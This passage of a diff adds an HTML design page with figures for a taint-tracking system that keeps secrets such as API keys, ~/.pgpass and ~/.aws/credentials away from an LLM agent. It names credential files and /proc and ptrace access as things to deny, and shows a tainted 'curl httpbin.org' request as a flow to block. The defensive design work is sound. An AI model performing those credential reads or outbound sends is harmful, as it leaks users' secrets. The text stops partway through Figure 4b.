@@ -1,0 +1,785 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Flow-based confidentiality</title>
+<style>
+:root {
+  --ink:#1f1f1f; --muted:#6b6b6b; --line:#8a8a8a;
+  --secret:#b3261e; --secret-bg:#fbe9e7;
+  --ok:#2e6b3a; --ok-bg:#e8f2ea;
+  --ph:#e6e6e6; --bg:#ffffff;
+  color-scheme: light dark;
+}
+@media (prefers-color-scheme: dark) {
+  :root:not([data-theme="light"]) {
+    --ink:#e6e6e6; --muted:#a3a3a3; --line:#7a7a7a;
+    --secret:#f08a82; --secret-bg:#3b1e1b;
+    --ok:#8ccb9a; --ok-bg:#1c3122;
+    --ph:#2a2a2a; --bg:#141414;
+  }
+}
+:root[data-theme="dark"] {
+  --ink:#e6e6e6; --muted:#a3a3a3; --line:#7a7a7a;
+  --secret:#f08a82; --secret-bg:#3b1e1b;
+  --ok:#8ccb9a; --ok-bg:#1c3122;
+  --ph:#2a2a2a; --bg:#141414;
+}
+html { background: var(--bg); }
+body {
+  margin: 0; padding: 24px 16px 48px;
+  background: var(--bg); color: var(--ink);
+  font: 14px/1.45 system-ui, -apple-system, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+}
+main { max-width: 960px; margin: 0 auto; }
+h1 { font-size: 18px; font-weight: 600; margin: 0 0 28px; }
+h2 { font-size: 14px; font-weight: 600; margin: 32px 0 12px; }
+h3 { font-size: 13px; font-weight: 600; margin: 0 0 8px; }
+code, .mono { font-family: ui-monospace, "SFMono-Regular", Menlo, Consolas, "Liberation Mono", monospace; font-size: 12px; }
+figure { margin: 0 0 8px; }
+figcaption, p.cap { font-size: 13px; color: var(--ink); margin: 10px 0 0; }
+p.note { font-size: 12px; color: var(--muted); margin: 8px 0 0; }
+svg { display: block; width: 100%; height: auto; overflow: visible; }
+
+/* Figure 1: tables */
+.tables { display: grid; grid-template-columns: 1fr 1fr; gap: 24px; align-items: start; }
+@media (max-width: 700px) { .tables { grid-template-columns: 1fr; } }
+.tables > div, .grid > svg { min-width: 0; }
+.tw { overflow-x: auto; }
+.fig2 { overflow-x: auto; }
+.fig2 svg { min-width: 760px; }
+table { border-collapse: collapse; width: 100%; font-size: 13px; }
+th, td { border: 1px solid var(--line); padding: 5px 8px; text-align: left; vertical-align: top; }
+th { font-weight: 600; border-bottom: 1px solid var(--ink); }
+td.r1 { color: var(--secret); }
+td.r2 { color: var(--ok); }
+td.r3 { color: var(--ink); }
+td.rn { color: var(--muted); }
+td.k { font-weight: 600; white-space: nowrap; }
+span.muted { color: var(--muted); }
+
+/* Figure 3 grid: two columns, three rows */
+.grid { display: grid; grid-template-columns: 1fr 1fr; gap: 12px 24px; }
+@media (max-width: 700px) { .grid { grid-template-columns: 1fr; } }
+
+/* Figure 4 comparison table */
+.cmp { margin-top: 16px; }
+
+/* SVG classes */
+.bx { fill: var(--bg); stroke: var(--ink); stroke-width: 1; }
+.bx-secret { fill: var(--secret-bg); stroke: var(--secret); stroke-width: 1; }
+.bx-secret-o { fill: var(--bg); stroke: var(--secret); stroke-width: 1; }
+.bx-ok { fill: var(--ok-bg); stroke: var(--ok); stroke-width: 1; }
+.bx-ph { fill: url(#hatch); stroke: var(--ink); stroke-width: 1; stroke-dasharray: 3 2; }
+.ln { fill: none; stroke: var(--ink); stroke-width: 1; }
+.ln-a { marker-end: url(#ah); }
+.ln-ok { fill: none; stroke: var(--ok); stroke-width: 1; marker-end: url(#ah-ok); }
+.ln-secret { fill: none; stroke: var(--secret); stroke-width: 1; marker-end: url(#ah-secret); }
+.ln-sep { fill: none; stroke: var(--line); stroke-width: 1; stroke-dasharray: 4 3; }
+svg text { font-family: system-ui, -apple-system, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; font-size: 12px; fill: var(--ink); }
+svg text.m, svg tspan.m { font-family: ui-monospace, "SFMono-Regular", Menlo, Consolas, "Liberation Mono", monospace; font-size: 11px; }
+svg text.m10, svg tspan.m10 { font-family: ui-monospace, "SFMono-Regular", Menlo, Consolas, "Liberation Mono", monospace; font-size: 10px; }
+svg text.s11 { font-size: 11px; }
+svg text.s13 { font-size: 13px; }
+svg text.b { font-weight: 600; }
+svg text.muted, svg tspan.muted { fill: var(--muted); }
+svg text.secret, svg tspan.secret { fill: var(--secret); }
+svg text.ok, svg tspan.ok { fill: var(--ok); }
+.c { text-anchor: middle; }
+.e { text-anchor: end; }
+</style>
+</head>
+<body>
+<main>
+<h1>Flow-based confidentiality: the design in four figures <span class="muted">(as first built; revised 2026-10-04)</span></h1>
+<p class="note"><b>Revised by Plan 13 D8 (12), 2026-10-04.</b> These figures show Plan 10 as first built, when the consumer table made <code>psql</code>, <code>aws</code>, <code>gh</code>, <code>git</code> and others default readers. That rule is inverted: raw bytes go only to a vetted reader (<code>ssh</code>, <code>ssh-add</code>) or to a program whose entry carries the human's word, <code>prints: nothing</code>; every other program gets the twin. A printer (<code>git</code>, <code>curl</code>, <code>scp</code>, <code>psql</code>, <code>pg_restore</code>) or a program that runs code (<code>bash</code>, <code>node</code>, <code>python3</code>) admits nothing, so the panels that show them reading raw (the two tables, Figures 3b, 3c, 3e and 4b, and rows 4 to 6 of Figure 4e) describe the old behavior. The current model is drawn in <a href="reader-set-labels.html">reader-set-labels.html</a> and stated in <code>confidentiality-plan-13-reader-set-labels.md</code> §3 D8.</p>
+
+<!-- shared defs: hatch pattern for placeholders, three arrowheads -->
+<svg width="0" height="0" style="position:absolute;width:0;height:0" aria-hidden="true">
+  <defs>
+    <pattern id="hatch" width="6" height="6" patternUnits="userSpaceOnUse" patternTransform="rotate(45)">
+      <rect width="6" height="6" fill="var(--ph)"/>
+      <line x1="0" y1="0" x2="0" y2="6" stroke="var(--line)" stroke-width="1" opacity="0.7"/>
+    </pattern>
+    <marker id="ah" viewBox="0 0 8 8" refX="7" refY="4" markerWidth="7" markerHeight="7" orient="auto-start-reverse">
+      <path d="M0,0.5 L8,4 L0,7.5 z" fill="var(--ink)"/>
+    </marker>
+    <marker id="ah-ok" viewBox="0 0 8 8" refX="7" refY="4" markerWidth="7" markerHeight="7" orient="auto-start-reverse">
+      <path d="M0,0.5 L8,4 L0,7.5 z" fill="var(--ok)"/>
+    </marker>
+    <marker id="ah-secret" viewBox="0 0 8 8" refX="7" refY="4" markerWidth="7" markerHeight="7" orient="auto-start-reverse">
+      <path d="M0,0.5 L8,4 L0,7.5 z" fill="var(--secret)"/>
+    </marker>
+  </defs>
+</svg>
+
+<!-- ============ Figure 1 ============ -->
+<h2>Two tables decide every flow</h2>
+<figure>
+<div class="tables">
+  <div>
+    <h3>Per file: who may read the raw bytes, where it may go</h3>
+    <div class="tw"><table>
+      <thead><tr><th>file</th><th>label</th><th>raw readers</th><th>may leave to</th></tr></thead>
+      <tbody>
+        <tr><td><code>~/.config/gh/hosts.yml</code></td><td>S0</td><td class="rn">(no list) <code>gh</code> raw, pinned (known consumer); all others: twin</td><td><code>api.github.com</code></td></tr>
+        <tr><td><code>.env</code></td><td>S1</td><td>bash, node</td><td><code>api.stripe.com</code></td></tr>
+        <tr><td><code>~/.pgpass</code></td><td>S2</td><td>psql</td><td><code>db.internal:5432</code></td></tr>
+        <tr><td><code>~/.aws/credentials</code></td><td>S3</td><td>aws</td><td><code>*.amazonaws.com</code></td></tr>
+        <tr><td><code>$STRIPE_KEY</code> <span class="muted">(environment variable)</span></td><td>S1</td><td class="rn">none in v1: twin-only, released at the wire</td><td><code>api.stripe.com</code></td></tr>
+      </tbody>
+    </table></div>
+    <p class="note">No reader list: every program, the LLM included, reads the structured twin (keys raw, values as symbols), served by a bind mount or, where no bind can mount, by the guard injecting the twin's descriptor. Exception: a program in the built-in consumer table (psql for <code>~/.pgpass</code>, aws, gh, npm, docker, kubectl, ssh and git for <code>~/.ssh/id_*</code>, curl for <code>~/.netrc</code>, twine, cargo) is a default reader of its file: raw, tainted, pinned by path and hash on first use.</p>
+    <p class="note">A reader list is exhaustive: listed apps read raw and are tainted; every other app is denied (EACCES), except a known consumer, whose open is held for the human (an Inbox row: allow / once / deny; EACCES after 60 s, the row stays pending). <code>others: twin</code> restores the twin for the rest. The LLM always reads the twin; in <code>full</code> mode an untrusted-lineage process is never a reader.</p>
+    <p class="note">Environment variables matching the secret shapes are replaced by symbols at launch and released at the wire only; a signing credential (SigV4) must stay in its file to have a reader path.</p>
+  </div>
+  <div>
+    <h3>Per app: what its output becomes once it is tainted</h3>
+    <div class="tw"><table>
+      <thead><tr><th>app</th><th>output rule</th></tr></thead>
+      <tbody>
+        <tr><td>bash</td><td class="r1">(i) whole output is secret</td></tr>
+        <tr><td>node</td><td class="r1">(i) whole output is secret</td></tr>
+        <tr><td>psql</td><td class="r2">(ii) output is not secret <span class="muted">(written on the reader entry; a reader's default is (i))</span></td></tr>
+        <tr><td>aws</td><td class="r3">(iii) only matching spans are secret: <code>AKIA[0-9A-Z]{16}</code>, <code>"SecretAccessKey": "[^"]+"</code> <span class="muted">(expert entry; default (i))</span></td></tr>
+        <tr><td>git</td><td class="rn">not a reader of anything: twin where no list exists, EACCES where one does (Figure 3d)</td></tr>
+        <tr><td>any unlisted app</td><td class="r1">(i) whole output is secret</td></tr>
+      </tbody>
+    </table></div>
+    <p class="note">The rules are <code>output: secret</code> (i), <code>clear</code> (ii) and <code>mask: [regex…]</code> (iii), written in <code>policy.yaml</code> on one file's reader entry (<code>paths[].readers: [{app: deploy, prints: nothing, output: clear}]</code>), so a rule speaks for that file and that program only; the older program-wide <code>apps:</code> table is deprecated and clears nothing. Every reader, consumer table included, starts at (i). A program that runs code (bash, node, python…) can only be (i). The strictest rule in a tool call's process tree governs its output, and a verbatim-value scan backstops (ii) and (iii).</p>
+  </div>
+</div>
+<figcaption>Figure 1. Two tables decide every flow. The per-file table names the label, the raw readers and the permitted destinations; the per-app table says what a tainted app's output becomes before the model sees it.</figcaption>
+</figure>
+
+<!-- ============ Figure 2 ============ -->
+<h2>One process, from open() to its four outputs</h2>
+<figure>
+<div class="fig2">
+<svg viewBox="0 0 960 545" xmlns="http://www.w3.org/2000/svg" role="img" aria-label="Figure 2">
+  <!-- file -->
+  <path class="bx" d="M16,245 h78 l16,16 v34 h-94 z"/>
+  <path class="ln" d="M94,245 v16 h16"/>
+  <text class="c m" x="63" y="268">.env</text>
+  <text class="c s11" x="63" y="284">(label S1)</text>
+
+  <!-- open() -->
+  <path class="ln ln-a" d="M110,270 H148"/>
+  <text class="c m" x="129" y="262">open()</text>
+
+  <!-- decision -->
+  <polygon class="bx" points="150,270 165,235 335,235 350,270 335,305 165,305"/>
+  <text class="c b" x="250" y="256">interposer:</text>
+  <text class="c s11" x="250" y="271">does .env have a reader list,</text>
+  <text class="c s11" x="250" y="286">and is this app on it?</text>
+
+  <!-- no branch: two outcomes -->
+  <path class="ln" d="M250,305 V322"/>
+  <path class="ln" d="M136,322 H354"/>
+  <path class="ln ln-a" d="M136,322 V342"/>
+  <path class="ln ln-a" d="M354,322 V342"/>
+  <text class="s11" x="256" y="318">no</text>
+  <rect class="bx-ph" x="26" y="344" width="220" height="40"/>
+  <text class="c b" x="136" y="361">no list:</text>
+  <text class="c" x="136" y="376">structured twin</text>
+  <text class="c s11 muted" x="136" y="401">keys raw, values are symbols;</text>
+  <text class="c s11 muted" x="136" y="414">process untainted (bind, or the guard's fd)</text>
+  <rect class="bx-secret-o" x="254" y="344" width="200" height="40"/>
+  <text class="c" x="354" y="361">list exists, app not on it:</text>
+  <text class="c m b secret" x="354" y="376">EACCES</text>
+  <text class="c s11 muted" x="354" y="401">loud failure, [mandu:secret] note;</text>
+  <text class="c s11 muted" x="354" y="414">others: twin restores the twin</text>
+  <!-- the two exceptions, as built -->
+  <path class="ln" d="M250,322 V438"/>
+  <path class="ln" d="M136,438 H354"/>
+  <path class="ln ln-a" d="M136,438 V456"/>
+  <path class="ln ln-a" d="M354,438 V456"/>
+  <text class="s11 muted" x="258" y="434">two exceptions, as built</text>
+  <rect class="bx-secret" x="26" y="458" width="220" height="40"/>
+  <text class="c b" x="136" y="475">no list, known consumer:</text>
+  <text class="c secret" x="136" y="490">raw, tainted, pinned</text>
+  <text class="c s11 muted" x="136" y="515">consumer table (psql, aws, gh…);</text>
+  <text class="c s11 muted" x="136" y="528">rule (i) until the user flips it</text>
+  <rect class="bx-secret-o" x="254" y="458" width="200" height="40"/>
+  <text class="c b" x="354" y="475">known consumer, not listed:</text>
+  <text class="c" x="354" y="490">open held, Inbox row</text>
+  <text class="c s11 muted" x="354" y="515">allow / once / deny; EACCES after 60 s,</text>
+  <text class="c s11 muted" x="354" y="528">a standing allow writes the pin</text>
+
+  <!-- yes branch -->
+  <path class="ln ln-a" d="M350,270 H368"/>
+  <text class="c s11" x="359" y="263">yes</text>
+  <rect class="bx-secret" x="370" y="245" width="130" height="50"/>
+  <text class="c b" x="435" y="264">process: bash</text>
+  <text class="c secret" x="435" y="278">tainted with S1</text>
+  <text class="c s11 muted" x="435" y="291">(pinned: path + sha256)</text>
+
+  <!-- fan-out trunk -->
+  <path class="ln" d="M500,270 H528"/>
+  <path class="ln" d="M528,78 V440"/>
+  <path class="ln ln-a" d="M528,78 H543"/>
+  <path class="ln ln-a" d="M528,200 H543"/>
+  <path class="ln ln-a" d="M528,330 H543"/>
+  <path class="ln ln-a" d="M528,440 H543"/>
+  <text class="e m" x="522" y="74">stdout / stderr</text>
+  <text class="e m" x="522" y="196">connect()</text>
+  <text class="e m" x="522" y="326">write()</text>
+  <text class="e m" x="522" y="436">fork / exec / pipe</text>
+
+  <!-- row 1: stdout / stderr -->
+  <rect class="bx" x="545" y="58" width="135" height="40"/>
+  <text class="c" x="612" y="74">per-app output rule</text>
+  <text class="c" x="612" y="89">(i) / (ii) / (iii)</text>
+  <text class="c s11 muted" x="612" y="113">strictest rule in the call's tree;</text>
+  <text class="c s11 muted" x="612" y="126">value scan backstops (ii)/(iii)</text>
+  <path class="ln ln-a" d="M680,78 H698"/>
+  <rect class="bx" x="700" y="63" width="90" height="30"/>
+  <text class="c" x="745" y="75">model-API</text>
+  <text class="c" x="745" y="88">proxy</text>
+  <path class="ln ln-a" d="M790,78 H800 V42 H810"/>
+  <path class="ln ln-a" d="M800,78 V114 H810"/>
+  <rect class="bx-ph" x="812" y="27" width="146" height="30"/>
+  <text class="c s11" x="886" y="40">LLM sees</text>
+  <text class="c m" x="886" y="52">$MDU:nomodel_Exec[3f1a]</text>
+  <rect class="bx" x="812" y="99" width="146" height="30"/>
+  <text class="c s11" x="886" y="112">human sees the real text</text>
+  <text class="c s11 muted" x="886" y="124">(reply filter)</text>
+
+  <!-- row 2: connect() -->
+  <rect class="bx" x="545" y="175" width="155" height="50"/>
+  <text class="c" x="622" y="190">net-guard:</text>
+  <text class="c" x="622" y="204">is the destination</text>
+  <text class="c" x="622" y="218">bound to S1?</text>
+  <text class="c s11 muted" x="622" y="242">INET and AF_UNIX (unix:&lt;prefix&gt;);</text>
+  <text class="c s11 muted" x="622" y="255">denied in-kernel (EACCES) + Inbox row</text>
+  <path class="ln-ok" d="M700,200 H712 V172 H810"/>
+  <path class="ln-secret" d="M712,200 V228 H810"/>
+  <rect class="bx-ok" x="812" y="157" width="146" height="30"/>
+  <text class="c m" x="886" y="169">api.stripe.com</text>
+  <text class="c s11 ok" x="886" y="182">allow</text>
+  <rect class="bx-secret" x="812" y="213" width="146" height="30"/>
+  <text class="c m" x="886" y="225">httpbin.org</text>
+  <text class="c s11 secret" x="886" y="238">ask the human / deny</text>
+
+  <!-- row 3: write() -->
+  <rect class="bx-secret" x="545" y="312" width="175" height="36"/>
+  <text class="c m" x="632" y="327">deploy.log</text>
+  <text class="c secret" x="632" y="342">inherits label S1</text>
+  <text class="s11 muted" x="735" y="327">its next reader is checked</text>
+  <text class="s11 muted" x="735" y="342">against S1's reader list</text>
+
+  <!-- row 4: fork / exec / pipe -->
+  <rect class="bx-secret" x="545" y="420" width="365" height="70"/>
+  <text class="c" x="727" y="436">children inherit the taint; a process that reads</text>
+  <text class="c" x="727" y="451">a tainted pipe becomes tainted too</text>
+  <text class="c s11 muted" x="727" y="468">/proc/&lt;pid&gt;/{mem,environ,fd} of a tainted pid: EACCES;</text>
+  <text class="c s11 muted" x="727" y="482">ptrace and process_vm_* against it: EPERM</text>
+</svg>
+</div>
+<figcaption>Figure 2. A process on the file's reader list carries the file's label for the rest of its life; the label follows every output channel, and the per-app rule only decides what the model gets to see of stdout. A process not on the list gets the structured twin when no list exists, EACCES when one does; the two exceptions are the consumer table (a default reader with no list) and the held open (a known consumer the list omits). The interposer also traps <code>execve</code> to record lineage, so a tool call is matched to its process tree by exec signature.</figcaption>
+</figure>
+
+<!-- ============ Figure 3 ============ -->
+<h2>Six programs in one session</h2>
+<figure>
+<div class="grid">
+
+<!-- (a) claude -->
+<svg viewBox="0 0 460 250" xmlns="http://www.w3.org/2000/svg" role="img" aria-label="Figure 3a">
+  <text class="b s13" x="8" y="20">(a) claude</text>
+  <text class="m" x="8" y="40">Read(".env")</text>
+  <rect class="bx" x="8" y="94" width="48" height="32"/>
+  <text class="c m" x="32" y="114">.env</text>
+  <path class="ln ln-a" d="M56,110 H70"/>
+  <rect class="bx" x="72" y="94" width="88" height="32"/>
+  <text class="c s11" x="116" y="114">never a reader</text>
+  <path class="ln ln-a" d="M160,110 H174"/>
+  <rect class="bx-ph" x="176" y="94" width="96" height="32"/>
+  <text class="c s11" x="224" y="114">structured twin</text>
+  <path class="ln ln-a" d="M272,110 H286"/>
+  <rect class="bx" x="288" y="88" width="168" height="44"/>
+  <text class="c s11" x="372" y="103">LLM sees the twin text:</text>
+  <text class="c s11" x="372" y="118">keys raw, values are symbols</text>
+  <text x="8" y="192">the LLM's process is on no reader list, ever</text>
+  <text class="s11 muted" x="8" y="210">twin line: <tspan class="m">STRIPE_KEY='$MDU:nomodel_Read[9bbd].STRIPE_KEY'</tspan></text>
+  <text class="s11 muted" x="8" y="226">whole-file symbol only when the file's shape is unknown</text>
+</svg>
+
+<!-- (b0) bash, no reader list -->
+<svg viewBox="0 0 460 250" xmlns="http://www.w3.org/2000/svg" role="img" aria-label="Figure 3b0">
+  <text class="b s13" x="8" y="20">(b0) bash</text>
+  <text class="m" x="8" y="40">. ./.env &amp;&amp; ./deploy.sh   <tspan class="muted">(no reader list)</tspan></text>
+  <rect class="bx" x="8" y="94" width="56" height="32"/>
+  <text class="c m" x="36" y="114">.env</text>
+  <path class="ln ln-a" d="M64,110 H86"/>
+  <rect class="bx-ph" x="88" y="94" width="96" height="32"/>
+  <text class="c s11" x="136" y="114">structured twin</text>
+  <path class="ln ln-a" d="M184,110 H204"/>
+  <rect class="bx" x="206" y="94" width="76" height="32"/>
+  <text class="c b" x="244" y="107">bash</text>
+  <text class="c s11" x="244" y="121">untainted</text>
+  <path class="ln-ok" d="M282,110 H292 V73 H302"/>
+  <path class="ln-secret" d="M292,110 V150 H302"/>
+  <rect class="bx-ok" x="304" y="50" width="152" height="46"/>
+  <text class="c m" x="380" y="63">curl api.stripe.com</text>
+  <text class="c s11 ok" x="380" y="77">released at the wire</text>
+  <text class="c s11 ok" x="380" y="90">(proxy sees the body)</text>
+  <rect class="bx-secret-o" x="304" y="126" width="152" height="48"/>
+  <text class="c s11" x="380" y="140">symbol inside</text>
+  <text class="c s11" x="380" y="153">a TLS tunnel: blocked,</text>
+  <text class="c s11 secret" x="380" y="166">with a reason</text>
+  <text x="8" y="192">LLM sees the real output</text>
+  <text class="s11 muted" x="8" y="210">twin line: <tspan class="m">STRIPE_KEY='$MDU:nomodel_Read[9bbd].STRIPE_KEY'</tspan></text>
+</svg>
+
+<!-- (b) bash, readers: [bash] -->
+<svg viewBox="0 0 460 250" xmlns="http://www.w3.org/2000/svg" role="img" aria-label="Figure 3b">
+  <text class="b s13" x="8" y="20">(b) bash</text>
+  <text class="m" x="8" y="40">. ./.env &amp;&amp; ./deploy.sh   <tspan class="muted">(readers: [bash])</tspan></text>
+  <rect class="bx" x="8" y="94" width="56" height="32"/>
+  <text class="c m" x="36" y="114">.env</text>
+  <path class="ln ln-a" d="M64,110 H88"/>
+  <rect class="bx" x="90" y="94" width="86" height="32"/>
+  <text class="c" x="133" y="114">reader: raw</text>
+  <path class="ln ln-a" d="M176,110 H200"/>
+  <rect class="bx-secret" x="202" y="94" width="98" height="32"/>
+  <text class="c b" x="251" y="107">bash</text>
+  <text class="c s11 secret" x="251" y="121">tainted S1</text>
+  <path class="ln-ok" d="M300,110 H310 V72 H322"/>
+  <path class="ln-secret" d="M310,110 V148 H322"/>
+  <rect class="bx-ok" x="324" y="56" width="132" height="32"/>
+  <text class="c m" x="390" y="69">curl api.stripe.com</text>
+  <text class="c s11 ok" x="390" y="83">allow</text>
+  <rect class="bx-secret" x="324" y="132" width="132" height="32"/>
+  <text class="c m" x="390" y="145">curl httpbin.org</text>
+  <text class="c s11 secret" x="390" y="159">ask</text>
+  <text x="8" y="192">rule (i): LLM sees <tspan class="m">$MDU:nomodel_Exec[3f1a]</tspan></text>
+  <text class="s11 muted" x="8" y="210">human sees "deployed v1.4"</text>
+</svg>
+
+<!-- (c) psql -->
+<svg viewBox="0 0 460 250" xmlns="http://www.w3.org/2000/svg" role="img" aria-label="Figure 3c">
+  <text class="b s13" x="8" y="20">(c) psql</text>
+  <text class="m" x="8" y="40">-c 'select count(*) from users'   <tspan class="muted">(consumer table)</tspan></text>
+  <rect class="bx" x="8" y="94" width="72" height="32"/>
+  <text class="c m" x="44" y="114">~/.pgpass</text>
+  <path class="ln ln-a" d="M80,110 H102"/>
+  <rect class="bx" x="104" y="94" width="86" height="32"/>
+  <text class="c s11" x="147" y="109">default reader:</text>
+  <text class="c s11" x="147" y="122">raw, pinned</text>
+  <path class="ln ln-a" d="M190,110 H212"/>
+  <rect class="bx-secret" x="214" y="94" width="88" height="32"/>
+  <text class="c b" x="258" y="107">psql</text>
+  <text class="c s11 secret" x="258" y="121">tainted S2</text>
+  <path class="ln-ok" d="M302,110 H324"/>
+  <rect class="bx-ok" x="326" y="88" width="126" height="44"/>
+  <text class="c s11" x="389" y="101">connect</text>
+  <text class="c m" x="389" y="115">db.internal:5432</text>
+  <text class="c s11 ok" x="389" y="128">allow</text>
+  <text x="8" y="192">default (i): LLM sees <tspan class="m">$MDU:nomodel_Exec[…]</tspan></text>
+  <text x="8" y="210">after the user's switch, (ii): <tspan class="m">"count 1204"</tspan></text>
+  <text class="s11 muted" x="8" y="228">risk under (ii): psql must not be coercible into printing the pgpass;</text>
+  <text class="s11 muted" x="8" y="244">a verbatim-value scan is the backstop</text>
+</svg>
+
+<!-- (d) git -->
+<svg viewBox="0 0 460 250" xmlns="http://www.w3.org/2000/svg" role="img" aria-label="Figure 3d">
+  <text class="b s13" x="8" y="20">(d) git</text>
+  <text class="m" x="8" y="40">commit -a   <tspan class="muted">(.env tracked)</tspan></text>
+  <rect class="bx" x="8" y="94" width="56" height="32"/>
+  <text class="c m" x="36" y="114">.env</text>
+  <path class="ln ln-a" d="M64,110 H88"/>
+  <rect class="bx" x="90" y="94" width="88" height="32"/>
+  <text class="c" x="134" y="114">not a reader</text>
+  <path class="ln-ok" d="M178,110 H188 V80 H200"/>
+  <path class="ln-secret" d="M188,110 V144 H200"/>
+  <rect class="bx-ok" x="202" y="56" width="254" height="48"/>
+  <text class="c" x="329" y="71">no list: reads the twin;</text>
+  <text class="c m" x="329" y="85">commit -a commits TOKENS</text>
+  <text class="c s11 ok" x="329" y="98">(utility defect, noted)</text>
+  <rect class="bx-secret" x="202" y="126" width="254" height="36"/>
+  <text class="c" x="329" y="141">list exists: <tspan class="m">EACCES</tspan>,</text>
+  <text class="c s11 secret" x="329" y="156">add fails loudly</text>
+</svg>
+
+<!-- (e) aws -->
+<svg viewBox="0 0 460 250" xmlns="http://www.w3.org/2000/svg" role="img" aria-label="Figure 3e">
+  <text class="b s13" x="8" y="20">(e) aws</text>
+  <text class="m" x="8" y="40">s3 ls   <tspan class="muted">(consumer table; apps: aws mask)</tspan></text>
+  <rect class="bx" x="8" y="94" width="118" height="32"/>
+  <text class="c m10" x="67" y="114">~/.aws/credentials</text>
+  <path class="ln ln-a" d="M126,110 H148"/>
+  <rect class="bx" x="150" y="94" width="82" height="32"/>
+  <text class="c s11" x="191" y="109">default reader:</text>
+  <text class="c s11" x="191" y="122">raw, pinned</text>
+  <path class="ln ln-a" d="M232,110 H254"/>
+  <rect class="bx-secret" x="256" y="94" width="72" height="32"/>
+  <text class="c b" x="292" y="107">aws</text>
+  <text class="c s11 secret" x="292" y="121">tainted S3</text>
+  <path class="ln-ok" d="M328,110 H346"/>
+  <rect class="bx-ok" x="348" y="88" width="108" height="44"/>
+  <text class="c s11" x="402" y="101">connect</text>
+  <text class="c m" x="402" y="115">*.amazonaws.com</text>
+  <text class="c s11 ok" x="402" y="128">allow</text>
+  <text x="8" y="192">rule (iii): bucket names raw; any <tspan class="m">AKIA…</tspan> span a symbol</text>
+  <text class="s11 muted" x="8" y="210">value scan backstops the regex</text>
+</svg>
+
+</div>
+<figcaption>Figure 3. The same two tables applied to six programs. Only the reader list decides who sees raw bytes (and, once written, who is denied); only the output rule decides what the model sees afterwards. A program in the consumer table is a default reader of its file, and every reader's output is rule (i) unless its reader entry for that file says otherwise.</figcaption>
+</figure>
+
+<!-- ============ Figure 4 ============ -->
+<h2>Source, process, sink: Mandu, Claude Code's mask and nono in the same frame</h2>
+
+<figure>
+<h3>Figure 4a. Mandu, a file with no reader list</h3>
+<div class="fig2">
+<svg viewBox="0 0 960 452" xmlns="http://www.w3.org/2000/svg" role="img" aria-label="Figure 4a">
+  <text class="c b s13" x="96" y="18">SOURCE (file)</text>
+  <text class="c b s13" x="365" y="18">PROCESS (the app that reads it)</text>
+  <text class="c b s13" x="850" y="18">SINKS</text>
+  <rect class="bx-ph" x="8" y="27" width="14" height="10"/>
+  <text class="s11" x="26" y="36">placeholder / symbol (hatched)</text>
+  <path class="ln-secret" style="marker-end:none" d="M212,32 H228"/>
+  <text class="s11" x="234" y="36">raw bytes, tainted (red)</text>
+  <path class="ln-ok" style="marker-end:none" d="M382,32 H398"/>
+  <text class="s11" x="404" y="36">released / allowed (green)</text>
+  <path class="ln-secret" style="marker-end:none" d="M566,32 H578"/>
+  <path class="ln-secret" style="marker-end:none;stroke-width:1.5" d="M582,26 V38"/>
+  <text class="s11" x="590" y="36">blocked (red bar)</text>
+  <path class="ln-sep" d="M8,44 H952"/>
+  <path class="bx" d="M16,208 h144 l16,16 v44 h-160 z"/>
+  <path class="ln" d="M160,208 v16 h16"/>
+  <text class="c m" x="96" y="236">.env</text>
+  <text class="c s11" x="96" y="250">(no readers:)</text>
+  <path class="ln ln-a" d="M176,238 H278"/>
+  <text class="c s11" x="228" y="188">structured twin: keys raw, each value a symbol</text>
+  <text class="c m10" x="228" y="202">STRIPE_KEY='$MDU:nomodel_Read[9bbd].STRIPE_KEY'</text>
+  <rect class="bx" x="280" y="213" width="170" height="50"/>
+  <text class="c b" x="365" y="235">bash</text>
+  <text class="c s11" x="365" y="249">untainted</text>
+  <path class="ln" d="M450,238 H490"/>
+  <path class="ln" d="M490,80 V390"/>
+  <path class="ln ln-a" d="M490,80 H758"/>
+  <text class="s11" x="498" y="75">tool result raw;</text>
+  <text class="s11" x="498" y="93">symbols stay opaque</text>
+  <rect class="bx-ph" x="760" y="63" width="180" height="34"/>
+  <text class="c " x="850" y="78">model context</text>
+  <text class="c s11" x="850" y="90">(the LLM)</text>
+  <path class="ln-ok" d="M490,142 H758"/>
+  <text class="s11" x="498" y="137">proxy swaps symbol → real value</text>
+  <text class="s11" x="498" y="155">(TLS inspected, on by default)</text>
+  <rect class="bx-ok" x="760" y="125" width="180" height="34"/>
+  <text class="c " x="850" y="140">bound host</text>
+  <text class="c m" x="850" y="152">api.stripe.com</text>
+  <path class="ln-secret" d="M490,204 H742"/>
+  <path class="ln-secret" style="marker-end:none;stroke-width:1.5" d="M748,195 V213"/>
+  <text class="s11" x="498" y="199">symbol withheld: request blocked,</text>
+  <text class="s11" x="498" y="217">Inbox row</text>
+  <rect class="bx-secret-o" x="760" y="187" width="180" height="34"/>
+  <text class="c " x="850" y="202">other host</text>
+  <text class="c m" x="850" y="214">httpbin.org</text>
+  <path class="ln ln-a" d="M490,266 H758"/>
+  <text class="s11" x="498" y="261">symbols written;</text>
+  <text class="s11" x="498" y="279">no label needed</text>
+  <rect class="bx-ph" x="760" y="249" width="180" height="34"/>
+  <text class="c " x="850" y="264">written file</text>
+  <text class="c m" x="850" y="276">deploy.log</text>
+  <path class="ln ln-a" d="M490,328 H758"/>
+  <text class="s11" x="498" y="323">same twin view;</text>
+  <text class="s11" x="498" y="341">untainted</text>
+  <rect class="bx-ph" x="760" y="311" width="180" height="34"/>
+  <text class="c " x="850" y="332">child process</text>
+  <path class="ln-ok" d="M490,390 H758"/>
+  <text class="s11" x="498" y="385">reply filter:</text>
+  <text class="s11" x="498" y="403">real values</text>
+  <rect class="bx-ok" x="760" y="373" width="180" height="34"/>
+  <text class="c " x="850" y="394">human terminal</text>
+</svg>
+</div>
+<figcaption>Figure 4a. Nobody holds the bytes. The only place the real value exists on the agent's side is inside the proxy, on the way to a bound host.</figcaption>
+</figure>
+
+<figure>
+<h3>Figure 4b. Mandu, readers: [psql]</h3>
+<div class="fig2">
+<svg viewBox="0 0 960 452" xmlns="http://www.w3.org/2000/svg" role="img" aria-label="Figure 4b">
+  <text class="c b s13" x="96" y="18">SOURCE (file)</text>
+  <text class="c b s13" x="365" y="18">PROCESS (the app that reads it)</text>
+  <text class="c b s13" x="850" y="18">SINKS</text>
+  <rect class="bx-ph" x="8" y="27" width="14" height="10"/>
